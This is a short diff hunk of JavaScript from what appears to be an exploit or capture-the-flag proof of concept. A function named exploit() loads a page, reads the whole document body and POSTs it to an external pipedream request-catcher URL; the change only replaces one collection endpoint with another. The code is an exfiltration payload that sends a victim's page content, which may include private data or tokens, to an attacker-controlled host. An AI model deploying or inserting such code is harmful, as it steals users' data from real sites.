@@ -8,7 +8,7 @@ async function load_home(_callback) {
 function exploit() {
   load_home(function () {
     var body = document.body.innerHTML;
-    fetch('https://eny56ahhsgh5.x.pipedream.net', {
+    fetch('https://en2gshq6hfr1r.x.pipedream.net', {
       method: 'POST',
       body: body
     })
